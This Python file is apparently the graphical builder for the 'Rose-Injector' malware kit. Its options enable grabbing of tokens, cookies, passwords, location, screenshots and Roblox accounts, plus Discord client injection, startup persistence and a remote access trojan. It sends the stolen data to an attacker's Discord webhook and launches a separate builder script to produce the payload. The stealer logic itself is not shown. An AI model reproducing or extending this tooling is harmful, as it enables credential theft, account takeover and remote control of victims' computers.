import psocials
import builder

from flaskwebgui import FlaskUI
from nicegui import ui
import requests
import random
import threading

from dhooks import Webhook, Embed 
import os 
from bs4 import BeautifulSoup
import shutil 
from pathlib import Path
import subprocess

__title__ = 'Rose UI Builder'
__avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/RoseWBG.png'
__version__ = '1.0'

__devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/roseui/msg.txt").text.splitlines()[0].split(" - ")

xstartup = False 
xinjections = False
xtoken = False 
xcookie = False 
xpassword = False 
xmalicious = False 
xlocation = False
xroblox = False
xrat = False
xscreenshot = False
xraturl = ""
xping = False
xwehookurl = ""
xbuildname = ""

xprogressvalue = False
 
 
def change_startups():
    global xstartup
    xstartup = not xstartup
    if xstartup:
        ui.notify("Startup has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
        return 
    ui.notify("Startup has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
 
def change_injections():
    global xinjections
    xinjections = not xinjections
    if xinjections:
        ui.notify("Injection has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
        return
    ui.notify("Injection has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
    
def change_tokens():
    global xtoken
    xtoken = not xtoken
    if xtoken:
        ui.notify("Token Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
        return
    ui.notify("Token Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
    
def change_cookies():
    global xcookie
    xcookie = not xcookie
    if xcookie:
        ui.notify("Cookies Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
        return
    ui.notify("Cookies Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
    
def change_passwords():
    global xpassword
    xpassword = not xpassword
    if xpassword:
        ui.notify("Passwords Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
        return
    ui.notify("Passwords Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
    
def change_screenshots():
    global xscreenshot
    xscreenshot = not xscreenshot
    if xscreenshot:
        ui.notify("Screenshot has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
        return
    ui.notify("Screenshot has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
    
def change_malicious():
    global xmalicious
    xmalicious = not xmalicious
    if xmalicious:
        ui.notify("Malicious Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
        return
    ui.notify("Malicious Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")

def change_locations():
    global xlocation
    xlocation = not xlocation
    if xlocation:
        ui.notify("Location Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
        return 
    ui.notify("Location Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")

def change_robloxs():
    global xroblox
    xroblox = not xroblox
    if xroblox:
        ui.notify("Roblox Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
        return
    ui.notify("Roblox Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
    
def change_rats():
    global xrat
    xrat = not xrat
    if xrat:
        ui.notify("RAT has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="yellow-7", position="top-right")
        return
    ui.notify("RAT has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="yellow-7", position="top-right")
    
def change_ratsurl(value):
    global xraturl
    xraturl = value   
    
def change_pings():
    global xping
    if xping:
        ui.notify("Ping has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="yellow-7", position="top-right")
        return
    ui.notify("Ping has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="yellow-7", position="top-right")
    
def change_wehookurl(value):
    global xwehookurl
    xwehookurl = value
    
def change_buildname(value):
    global xbuildname
    xbuildname = value
    
async def _test_webhook():
    result = await builder.test_webhook(xwehookurl)
    if result == 0:
        ui.notify("WebHook successfuly executed!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
        return 
    ui.notify("WebHook failed to execute!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")


__icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/tools/rose.png"


async def test_webhook(webhook_url):
    try:
        async with Webhook.Async(webhook_url) as hook:
            embed = Embed(
                description='Webhook is Working',
                color=11795068,
                timestamp="now"
            )
            embed.set_author(name="Success", icon_url=__icon__)
            embed.set_footer(text="Rose Builder | By pierro, suegdu, Gumbobrot, svn", icon_url=__icon__)
            await hook.send(embed=embed)
        return 0
    except Exception as e:
        print(e)
        return 1
            
def __build():
    global xraturl 
    path = f'{Path(__file__).resolve().parent}\\builder.py'
    print(path)
    if xraturl == "":
        xraturl = ".rat"
    msg = f"start cmd /c py {path} {xbuildname} {xwehookurl} {xrat} {xraturl} {xstartup} {xinjections} {xtoken} {xcookie} {xpassword} {xmalicious} {xlocation} {xroblox} {xscreenshot} {xping}"
    os.system(msg)
                    
def _makebuild():
    if xwehookurl == "":
        ui.notify("WebHook URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
        return 
    if xbuildname == "":
        ui.notify("Build Name is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
        return
    if xrat:
        if xraturl == "":
            ui.notify("RAT URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
            return
        
    ui.notify("Build has been started!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
    __build()
    
class Demo:
    def __init__(self):
        self.number = xprogressvalue

def _home():
    with ui.column():
        with ui.expansion('Infos', icon='star_rate').classes('w-full'):
            ui.input(label='WebHook URL', placeholder='Rose on top baby',
                    on_change=lambda e: change_wehookurl(e.value)).props('inline color=pink-3')
            ui.input(label='Build Name', placeholder='Rose on top baby',
                    on_change=lambda e: change_buildname(e.value)).props('inline color=pink-3')
        ui.button('Test WebHook', on_click=_test_webhook).props("icon=code color=purple-11").classes('w-full')
        ui.button('Build', on_click=_makebuild).props("icon=build color=pink-3").classes('w-full')

def _functions():
    with ui.column():
        with ui.expansion('System', icon='work').classes('w-full'):
            ui.checkbox('Startup', on_change=change_startups).props('inline color=pink')
            ui.checkbox('Injector', on_change=change_injections).props('inline color=pink')
            
        with ui.expansion('Grabber', icon='work').classes('w-full'):
            with ui.row():
                with ui.column():
                    ui.checkbox('Token', on_change=change_tokens).props('inline color=green')
                    ui.checkbox('Cookie', on_change=change_cookies).props('inline color=green')
                    ui.checkbox('Password', on_change=change_passwords).props('inline color=green')
                    ui.checkbox('Screenshot', on_change=change_screenshots).props('inline color=green')
                    
                with ui.column():
                    ui.checkbox('Malicious', on_change=change_malicious).props('inline color=green')
                    ui.checkbox('Location', on_change=change_locations).props('inline color=green')
                    ui.checkbox('Roblox', on_change=change_robloxs).props('inline color=green')
            
        with ui.expansion('Advanced', icon='work').classes('w-full'):
            with ui.column():
                with ui.row():
                    _rat = ui.checkbox('RAT', on_change=change_rats).props('inline color=yellow-7')
                    ui.input(label='RAT Server URL', placeholder='Rose on top baby',
                        on_change=lambda e: change_ratsurl(e.value)).bind_visibility_from(_rat, 'value').props('inline color=yellow-7')
                ui.checkbox('Ping', on_change=change_pings).props('inline color=yellow-7')
                
                
def _github():
    with ui.card():
        with ui.column():
            ui.markdown(f"<code>Message from {__devmsg__[0]}: {__devmsg__[1]}</code>")
            with ui.row():
                with ui.card_section():
                    ui.label("xpierroz").classes("text-h6")
                    ui.markdown('<em>- "GUMBO MAKE A FUCKING PR"</em>').classes("text-subtitle5")
                    with ui.row():
                        ui.button("GitHub", on_click=psocials.open_xpierroz)
                        #ui.label(" ") # Because the button are so sticked together without (sex button) - xpierroz 03/24
                        ui.button("Instagram", on_click=psocials.open_xpierroz_insta)
                    
                with ui.card_section():
                    ui.label("Gumbobrot").classes("text-h6")
                    ui.markdown('<em>- "buddy it\'s not my fault"</em>').classes("text-subtitle5")
                    ui.button("GitHub", on_click=psocials.open_gumbobrot)
                    
            with ui.row():               
                with ui.card_section():
                    ui.label("suegdu").classes("text-h6")
                    ui.markdown('<em>- "bruh"</em>').classes("text-subtitle5")
                    ui.button("GitHub", on_click=psocials.open_suegdu)
                    
                with ui.card_section():
                    ui.label("svn").classes("text-h6")
                    ui.markdown('<em>*svn died*</em>').classes("text-subtitle5")
                    ui.button("GitHub", on_click=psocials.open_svn)
    with ui.card():
        with ui.card_section():
            with ui.row():
                ui.label(f"Rose {__version__}").classes("text-h6")
                ui.button("GitHub", on_click=psocials.open_rose_github)
                ui.button("Discord", on_click=psocials.open_rose_discord)
                

ui.colors(primary='#333')
    
@ui.page('/home')
def superhome():
    ui.image('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/RoseWBG.png').style(
        'position: absolute; top: 3px; left: 575px; width: 90px;'
        )
    
        
        
    with ui.tabs().classes('w-full center') as tabs:
        ui.tab('Home', icon='home')
        ui.tab('Functions', icon='fingerprint')
        with ui.tab('Socials', icon='face'):
            ui.badge('0', color='purple-11').props('floating')
            
    with ui.tab_panels(tabs, value='Home').classes('bg-transparent').classes('w-full center'):
        with ui.tab_panel('Home'):
            _home()
        with ui.tab_panel('Functions'):
            _functions()
        with ui.tab_panel('Socials'):
            _github()

v = ui.video('https://github.com/DamagingRose/Rose-Injector/raw/main/assets/RoseLoadingScreen.mp4', autoplay=True, loop=False, muted=True, controls=False).style('position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;')
v.on('ended', lambda _: ui.open('/home'))
    
def start_nicegui(**kwargs):
    ui.run(
        title=__title__,
        **kwargs
    )

if __name__ in {"__main__", "__mp_main__"}:
    DEBUG = False

    if DEBUG:
        ui.run()
    else:
        FlaskUI(
            server=start_nicegui,
            server_kwargs={"dark": True, "reload": False, "show": False, "port": 3000},
            width=700,
            height=700, 
        ).run()